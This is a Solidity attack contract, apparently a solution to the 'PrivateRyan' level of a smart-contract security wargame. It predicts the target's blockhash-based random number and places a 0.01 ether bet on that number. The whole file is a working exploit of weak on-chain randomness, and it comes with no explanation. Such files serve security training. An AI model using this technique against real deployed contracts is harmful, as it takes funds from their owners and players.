pragma solidity ^0.4.18;

import '../levels/PrivateRyan.sol';

contract WeakRandomAttack2 {

  PrivateRyan target;
  uint private seed;

  function WeakRandomAttack2(address _target, uint _seed) public payable {
    target = PrivateRyan(_target);
    seed = _seed;
  }

  function attack() public {
    uint256 num = rand(100);
    target.spin.value(0.01 ether)(num);
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
